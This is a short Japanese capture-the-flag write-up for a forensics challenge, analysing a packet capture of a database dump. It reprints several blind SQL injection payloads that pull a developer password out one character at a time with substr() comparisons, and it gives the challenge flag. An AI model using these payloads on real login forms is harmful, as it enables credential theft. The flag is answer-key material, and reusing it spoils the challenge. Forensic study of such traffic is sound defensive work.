# Pain in the ass:Forensics:181pts
It looks like someone dumped our database. Please help us know what has been leaked ...  
[pain-in-the-ass.pcapng](pain-in-the-ass.pcapng)  

# Solution
pcapngなのでWiresharkで解析するが何も見当たらない。  
どうやらSQLインジェクションを試しているようだが、ペイロードもアルファベット順に試行されており、ユーザーネームもd4rk2phiと変わった点は見られない。  
stringsを行うと以下のような記述が見られた。  
```text
th3_fl4g_1s_n0t_h3r3
h3r3_1s_n0t_th3_fl4g
l00k1ng_f0r_34sy_p01nts
3rr0r_b4s3d_1s_s0_34syC
```
fl4gやb4s3dで文字列検索してやるとその上の部分のペイロードに含まれている一文字が以下のようになっていた。  
```text
SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),1,1) = 's' and '1';
SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),2,1) = 'h' and '1';
SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),3,1) = 'k' and '1';
SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),4,1) = 'C' and '1';
SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),5,1) = 'T' and '1';
SELECT * FROM users WHERE username = 'd4rk2phi' AND password ='' or substr((SELECT dev_password FROM developpers LIMIT 1 OFFSET 0),6,1) = 'F' and '1';
```
これがflagであった。  

## shkCTF{4lm0st_h1dd3n_3xtr4ct10n_0e18e336adc8236a0452cd570f74542}